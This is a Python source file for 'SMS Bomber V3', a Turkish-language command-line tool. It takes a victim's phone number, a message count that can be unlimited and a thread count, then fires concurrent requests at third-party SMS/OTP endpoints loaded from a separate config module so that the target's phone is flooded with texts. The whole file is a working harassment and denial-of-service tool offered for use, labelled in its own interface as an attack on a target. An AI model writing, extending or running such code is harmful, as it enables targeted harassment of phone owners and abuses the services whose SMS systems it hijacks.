import sys
import subprocess


missing_packages = []
try:
    import requests
except ImportError:
    missing_packages.append("requests")

try:
    from user_agent import generate_user_agent
except ImportError:
    missing_packages.append("user_agent")

try:
    import pyfiglet
except ImportError:
    missing_packages.append("pyfiglet")

try:
    import urllib3
except ImportError:
    missing_packages.append("urllib3")

try:
    from rich.console import Console
except ImportError:
    missing_packages.append("rich")

if missing_packages:
    subprocess.check_call([sys.executable, "-m", "pip", "install", *missing_packages])
    try:
        from rich.console import Console
        from time import sleep
        console = Console()
        msg = f"{', '.join(missing_packages)} yüklendi. [bold red]Lütfen programı tekrar başlatın![/bold red]"
        console.print("\n", style="bold")
        for char in msg:
            console.print(char, end="", style="bold red", soft_wrap=True, highlight=False)
            sleep(0.04)
        console.print("\n", style="bold")
    except Exception:
        print(f"{', '.join(missing_packages)} yüklendi. Lütfen programı tekrar başlatın.")
    sys.exit(0)

import socket
import json
import os
import random
import string
import time
import urllib.parse
import uuid
import concurrent.futures
import pyfiglet
import urllib3
from functools import partial
import threading
from datetime import datetime

from services_config import SERVICES
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich.progress import Progress, BarColumn, TimeElapsedColumn

console = Console()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

recent_logs = []
LOG_LIMIT = 10

def log_message(success, service_name, response_text=None):
    global recent_logs
    now = datetime.now().strftime("%H:%M:%S")
    def is_html(text):
        if not text:
            return False
        lowered = text.lower()
        return any(tag in lowered for tag in ["<html", "<!doctype", "<head", "<meta"])
    if success:
        status = "[bold black on bright_green] BAŞARILI [/bold black on bright_green]"
        msg = f"[{now}] {status} | [bold]{service_name}[/bold] | [black on bright_green]SMS gönderildi[/black on bright_green]"
    else:
        status = "[bold red]Hata[/bold red]"
        if is_html(response_text):
            short_resp = "[red]Sunucu HTML response döndürdü[/red]"
        else:
            short_resp = f"[red]{(response_text[:60] + '...') if response_text and len(response_text) > 60 else (response_text or '')}[/red]"
        msg = f"[{now}] {status} | [bold]{service_name}[/bold] | {short_resp}"
    message = Text.from_markup(msg)
    with print_lock:
        recent_logs.append(message)
        if len(recent_logs) > LOG_LIMIT:
            recent_logs.pop(0)
        console.print(message)

def send_request(service, number):
    service_name = service["name"]
    try:
        url = service["url"](number) if callable(service["url"]) else service["url"]
        
        json_payload = service.get("json_payload")
        if callable(json_payload):
            json_payload = json_payload(number)

        data_payload = service.get("data_payload")
        if callable(data_payload):
            data_payload = data_payload(number)

        headers = service.get("headers")
        if callable(headers):
            headers = headers(number)

        response = requests.request(
            method=service.get("method", "POST"),
            url=url,
            json=json_payload,
            data=data_payload,
            headers=headers,
            timeout=5,
            verify=service.get("verify", True)
        )

        success = service["success_condition"](response)
        log_message(success, service_name, response.text)
        return success, service_name
    except Exception as e:
        log_message(False, service_name, str(e))
        return False, service_name


def send_service_wrapper(number, service_config):
    global success_sends
    global failed_sends
    
    result, service_name = send_request(service_config, number)
    
    with counter_lock:
        if result:
            success_sends += 1
        else:
            failed_sends += 1

def generate_layout(number, amount, worker_amount) -> Table:
    layout = Table.grid(expand=True)
    layout.add_column(justify="center", ratio=1)
    
    header_table = Table.grid(expand=True)
    header_table.add_column(justify="center")
    header_table.add_row(f"[bold blue]Hedef:[/bold blue] [white]{number}[/white]  "
                       f"[bold blue]Miktar:[/bold blue] [white]{'Sınırsız' if amount == 0 else amount}[/white]  "
                       f"[bold blue]Thread:[/bold blue] [white]{worker_amount}[/white]")
    
    layout.add_row(Panel(header_table, title="[bold yellow]Saldırı Bilgileri[/bold yellow]", border_style="blue"))

    progress_table = Table.grid(expand=True)
    progress_table.add_column()
    progress_table.add_column(justify="right")
    progress_table.add_row("[bold green]Başarılı", "[bold red]Başarısız")
    layout.add_row(progress_table)

    layout.add_row(logs_panel())
    
    return layout

def logs_panel() -> Panel:
    log_renderable = Text("\n").join(recent_logs)
    return Panel(log_renderable, title="[bold yellow]Loglar[/bold yellow]", border_style="blue", height=LOG_LIMIT + 2)


def send(number, amount, worker_amount):
    global success_sends, failed_sends, recent_logs
    
    success_sends = 0
    failed_sends = 0
    recent_logs = []

    start_time = time.perf_counter()
    
    functions = SERVICES.copy()
    random.shuffle(functions)
    
    clear()
    watermark()
    
    total_requests = amount if amount != 0 else 1 

    with Progress(
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        "•",
        "[bold green]{task.fields[sends_completed]} Başarılı",
        "•",
        "[bold red]{task.fields[sends_failed]} Başarısız",
        "•",
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task(
            "[yellow]Gönderiliyor...", 
            total=total_requests, 
            sends_completed=0, 
            sends_failed=0
        )

        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            if amount == 0:
                progress.update(task, total=None)
                i = 0
                while True:
                    executor.submit(send_service_wrapper, number, functions[i])
                    i = (i + 1) % len(functions)
                    time.sleep(0.01)
                    progress.update(task, sends_completed=success_sends, sends_failed=failed_sends)
            else:
                for i in range(amount):
                    executor.submit(send_service_wrapper, number, functions[i % len(functions)])

                while (sent_count := success_sends + failed_sends) < amount:
                    progress.update(task, completed=sent_count, sends_completed=success_sends, sends_failed=failed_sends)
                    time.sleep(0.1)
                progress.update(task, completed=(success_sends + failed_sends), sends_completed=success_sends, sends_failed=failed_sends)
    
    elapsed_time = int(time.perf_counter() - start_time)
    
    summary_table = Table(title="[bold]Sonuçlar[/bold]", header_style="bold magenta", show_header=True)
    summary_table.add_column("Toplam Gönderim", style="cyan")
    summary_table.add_column("Başarılı", style="green")
    summary_table.add_column("Başarısız", style="red")
    summary_table.add_column("Süre", style="yellow")
    summary_table.add_row(str(success_sends + failed_sends), str(success_sends), str(failed_sends), f"{elapsed_time}s")
    
    console.print("\n")
    console.print(summary_table)
    console.print("\n")

    restart()


def watermark():
    lo = pyfiglet.figlet_format('Efe Kose', font='slant')
    console.print(Panel(Text(lo, justify="center"), style="bold blue", title="SMS Bomber V3"))
    console.print("[bold]Instagram: xld444[/bold]", justify="center")
    console.print(f"Hostname: [green]{socket.gethostname()}[/green] | IP: [green]{socket.gethostbyname(socket.gethostname())}[/green]", justify="center")
    console.print("-" * 60)


def get_input(prompt, password=False):
    return console.input(f"[bold yellow]{prompt}[/bold yellow] ")


def get_number():
    while True:
        num_str = get_input("Sms Gönderilecek Telefon Numarasını Giriniz (Örn: 530xxxxxxx):")
        if num_str.isdigit() and len(num_str) == 10 and num_str.startswith('5'):
            return num_str
        console.print("[bold red]Geçersiz numara. Numara '5' ile başlamalı ve 10 haneli olmalıdır.[/bold red]")


def get_amount():
    while True:
        amount_str = get_input('Kaç SMS gönderilsin? (Sınırsız için "0"):')
        try:
            amount = int(amount_str)
            if amount >= 0:
                return amount
            console.print("[bold red]Sayı 0'dan küçük olamaz.[/bold red]")
        except ValueError:
            console.print("[bold red]Lütfen geçerli bir sayı girin.[/bold red]")


def get_worker_amount():
    while True:
        worker_str = get_input("Thread sayısını girin (Tavsiye: 5-100):")
        try:
            worker_amount = int(worker_str)
            if worker_amount > 0:
                return worker_amount
            console.print("[bold red]Thread sayısı 0'dan büyük olmalıdır.[/bold red]")
        except ValueError:
            console.print("[bold red]Lütfen geçerli bir sayı girin.[/bold red]")


def restart():
    while True:
        choice = get_input("Tekrar denemek için 'Y', çıkmak için 'N' girin:").upper()
        if choice == 'Y':
            start()
            break
        elif choice == 'N':
            quit()
        else:
            console.print("[bold red]Geçersiz seçim.[/bold red]")

def start():
    clear()
    watermark()
    number = get_number()
    amount = get_amount()
    worker_amount = get_worker_amount()
    send(number=number, amount=amount, worker_amount=worker_amount)

print_lock = threading.Lock()
counter_lock = threading.Lock()
all_sends = 0
success_sends = 0
failed_sends = 0
clear = lambda: os.system("cls" if os.name == "nt" else "clear")

if __name__ == "__main__":
    start()
